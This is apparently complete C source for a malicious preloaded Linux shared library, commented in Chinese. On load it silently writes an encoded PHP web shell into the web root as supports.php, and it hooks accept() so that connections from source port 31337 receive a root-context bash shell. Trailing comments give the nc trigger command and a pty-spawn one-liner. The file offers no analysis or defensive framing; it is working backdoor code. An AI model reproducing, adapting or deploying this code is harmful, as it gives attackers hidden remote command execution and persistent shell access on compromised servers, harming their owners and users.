#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>


const char* base64EncodedString = "PD9waHAKCiRmdW5jID0gbmV3IFJlZmxlY3Rpb25GdW5jdGlvbigkX0dFVFttXSk7CgplY2hvICRmdW5jLT5pbnZva2VBcmdzKGFycmF5KCRfR0VUW2NdKSk7Cgo/Pg==";

int base64_decode(const char *encoded, unsigned char **decoded) {
    static const char base64_chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = strlen(encoded);
    if (in_len % 4 != 0) {
        return 0;
    }

    *decoded = (unsigned char *)malloc((in_len / 4) * 3);
    if (*decoded == NULL) {
        return 0;
    }

    int i, j;
    int len = 0;
    unsigned char a, b, c, d;

    for (i = 0; i < in_len; i += 4) {
        a = strchr(base64_chars, encoded[i]) - base64_chars;
        b = strchr(base64_chars, encoded[i + 1]) - base64_chars;
        c = strchr(base64_chars, encoded[i + 2]) - base64_chars;
        d = strchr(base64_chars, encoded[i + 3]) - base64_chars;

        (*decoded)[len++] = (a << 2) | (b >> 4);
        if (encoded[i + 2] != '=') {
            (*decoded)[len++] = (b << 4) | (c >> 2);
        }
        if (encoded[i + 3] != '=') {
            (*decoded)[len++] = (c << 6) | d;
        }
    }

    return len;
}

void createFileAndWriteDecodedBase64() {
    FILE *file;

    // 判断文件是否存在
    if ((file = fopen("/var/www/html/supports.php", "r")) == NULL) {
        // 文件不存在，创建文件并写入Base64解码字符串
        file = fopen("/var/www/html/supports.php", "w");
        if (file == NULL) {
         //   perror("Error creating file");
            return;
        }

        unsigned char *decoded_data;
        int decoded_length = base64_decode(base64EncodedString, &decoded_data);
        if (decoded_length > 0) {
            fwrite(decoded_data, sizeof(unsigned char), decoded_length, file);
            free(decoded_data);
        }

      //  printf("Base64 decoded string written to file.\n");
        fclose(file);
    } else {
        // 文件已存在
       // printf("File '1.php' already exists.\n");
        fclose(file);
    }
}




__attribute__ ((constructor)) static void so_init(void);
__attribute__ ((destructor)) static void so_deinit(void);



void so_init(void)
{

     createFileAndWriteDecodedBase64();

    //printf("call so init.\n");
}

void so_deinit(void)
{
   // printf("call so deinit.\n");
}





#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <pthread.h>
#include <stdarg.h>
#include <string.h>
#include <sys/un.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <pwd.h>

#define S_PORT 31337

int    (*_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);


int accept(int s, struct sockaddr *addr, socklen_t *addrlen) {

	char *argv[4];
	char *envp[3];
	int x;

	_accept = (int (*)(int sockfd, struct sockaddr *addr, socklen_t *addrlen)) dlsym(RTLD_NEXT,"accept");
	

 	struct sockaddr_in addr2;
	x = _accept(s, (struct sockaddr *)&addr2, addrlen);

	if(addr2.sin_port == htons(S_PORT)) {
	

		argv[0] = "/bin/bash";
		argv[1] = (char *)0;
		envp[0] = "HOME=/";
		envp[1] = "PATH=/:/sbin:/bin:/usr/sbin:/usr/bin";

		envp[2] = (char *)0;

            if(fork() == 0) {
			dup2(x,0);
			dup2(x,1);
			dup2(x,2);
			execve(argv[0], argv, envp);
                         } else {
                            close(x);
                            return -1;
                        }
	}

	return x;
}
//nc -v -p 31337 localhost 22
//python -c 'import pty; pty.spawn("/bin/bash")'


